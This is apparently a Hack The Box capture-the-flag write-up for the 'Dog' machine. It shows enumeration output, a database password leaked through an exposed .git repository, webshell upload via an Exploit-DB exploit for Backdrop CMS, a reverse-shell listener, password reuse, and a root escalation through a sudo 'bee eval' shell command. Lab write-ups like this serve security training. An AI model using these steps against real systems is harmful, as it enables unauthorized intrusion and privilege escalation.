
### Initial access
Port scan
```bash {24}
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home | Dog
| http-git: 
|   10.129.231.223:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.

```
Subdomain
```
┌──(kali㉿kali)-[~/HTB/Dog]
└─$ ffuf -u http://10.129.231.223 -H "Host: FUZZ.dog.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 1368

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.231.223
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.dog.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1368
________________________________________________

leto                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9706ms]
:: Progress: [4989/4989] :: Job [1/1] :: 17 req/sec :: Duration: [0:04:47] :: Errors: 0 ::

```
Dirscan
```
200     http://10.129.231.223/.git/config
200     http://10.129.231.223/.git/description
200     http://10.129.231.223/.git/index
200     http://10.129.231.223/.git/index
301     http://10.129.231.223/core
301     http://10.129.231.223/core/includes
301     http://10.129.231.223/core/layouts
301     http://10.129.231.223/core/misc
301     http://10.129.231.223/core/modules
301     http://10.129.231.223/core/profiles
301     http://10.129.231.223/core/scripts
301     http://10.129.231.223/core/themes
301     http://10.129.231.223/files
301     http://10.129.231.223/files/css
301     http://10.129.231.223/files/field
301     http://10.129.231.223/files/js
301     http://10.129.231.223/files/styles
301     http://10.129.231.223/.git
301     http://10.129.231.223/.git/branches
301     http://10.129.231.223/.git/hooks
301     http://10.129.231.223/.git/info
301     http://10.129.231.223/.git/logs
301     http://10.129.231.223/.git/objects
301     http://10.129.231.223/.git/refs
301     http://10.129.231.223/layouts
301     http://10.129.231.223/modules
301     http://10.129.231.223/sites
301     http://10.129.231.223/themes
403     http://10.129.231.223/server-status

```

We found .git  let dump it
```bash {17}
┌──(kali㉿kali)-[~/HTB/Dog]
└─$ cat settings.php 
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';


```
Find user
```
┌──(kali㉿kali)-[~/HTB/Dog]
└─$ git log --all -p | grep -Ei 'dog.htb'                  
Author: root <dog@dog.htb>
+        "tiffany@dog.htb"

```

After test which each user we have cred `tiffany:BackDropJ2024DS2024`  
Run this https://www.exploit-db.com/exploits/52021 and access admin/installer/manual to install webshell
```
tar -czvf shell.tar.gz shell/


```

So the thing is you must stay  in the `http://dog.htb/core/authorize.php` url after upload if you click to enable i will drop.
Get revshell
```bash
──(kali㉿kali)-[~/HTB/Dog]
└─$ penelope --oscp-safe --no-log -p 4444 
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => dog 10.129.231.223 Linux-x86_64 👤 www-data(33) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@dog:/var/www/html/modules/shell$ ls


```
### Lateral Movement
`johncusack:BackDropJ2024DS2024`
### Priv escalation
Run linpeas
```
╔══════════╣ Users with console (T1087.001)
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash                                                                                                                                                                                            
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
root:x:0:0:root:/root:/bin/bash

johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Sorry, try again.
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee

```

```bash
johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee eval 'system("/bin/sh -i")'
# id
uid=0(root) gid=0(root) groups=0(root)

```